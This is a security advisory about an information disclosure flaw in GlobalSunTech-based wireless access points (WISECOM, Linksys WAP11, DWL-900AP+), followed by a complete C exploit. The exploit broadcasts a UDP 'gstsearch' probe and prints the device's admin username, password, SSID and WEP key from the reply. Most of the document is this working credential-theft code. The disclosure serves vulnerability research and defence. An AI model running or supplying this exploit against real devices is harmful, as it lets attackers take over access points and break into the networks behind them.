source: http://www.securityfocus.com/bid/6100/info

An information disclosure vulnerability has been discovered in GlobalSunTech access points.

It has been reported that a remote attacker is able to retrieve sensitive information from vulnerable access points, including AP login credentials.

Information gained by exploiting this vulnerability may allow an attacker to launch further attacks against the target network.

It should be noted that this vulnerability was reported for a WISECOM GL2422AP-0T access point. Devices that use Global Sun Technology access points may be affected by this issue.

It has been determined that D-Link DI-614+ and SMC Barricade 7004AWBR access points are not affected by this issue.

It has been reported that Linksys WAP11-V2.2 is prone to this issue, but to a lesser extent. 

/*

 Orig version by Tom Knienieder <knienieder@khamsin.ch>
 Patched by H?kan Carlsson <hockey@easylogic.se> for DWL-900AP+ v2.2

*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/socket.h>

typedef struct {
        char type[32] /* [28] */;
	char scr1 [4];
        char name[32];
        char user[16];
        char pass[16];
	char scr2 [408];
	char ssid [32];
	char scr3 [61];
	unsigned char wkey [13];
}
__attribute__ ((packed)) answer;

int main()
{
        char rcvbuffer[1024];
        struct sockaddr_in sin;
        answer* ans = (answer *)rcvbuffer;
        int sd, ret, val;

        sin.sin_family          = AF_INET;
        sin.sin_addr.s_addr     = inet_addr("255.255.255.255");
        sin.sin_port            = htons(27155);

        sd = socket(AF_INET, SOCK_DGRAM, 0);
        if (sd < 0)
                perror("socket");

        val = 1;
        ret = setsockopt(sd, SOL_SOCKET, SO_BROADCAST, &val, sizeof(val));
        if (ret < 0)
        {
                perror("setsockopt");
                exit(1);
        }

        ret = sendto(sd, "gstsearch", 9, 0, (const struct sockaddr *)&sin,
			sizeof(struct sockaddr));
        if (ret < 0)
        {
                perror("sendto");
                exit(1);
        }

        ret = read(sd,&rcvbuffer,sizeof(rcvbuffer));

        printf("Type            : %.32s\n",ans->type);
        printf("Announced Name  : %s\n",ans->name);
        printf("Admin Username  : %s\n",ans->user);
        printf("Admin Password  : %s\n",ans->pass);
        printf("SSID            : %s\n",ans->ssid);
        printf("Wep KEY         : ");
	{
		int i = 0;
		for (i=0; i<sizeof(ans->wkey); i++) {
			printf ("%02x ", ans->wkey[i]);
		}
		printf ("\n");
	}

        return 0;
}
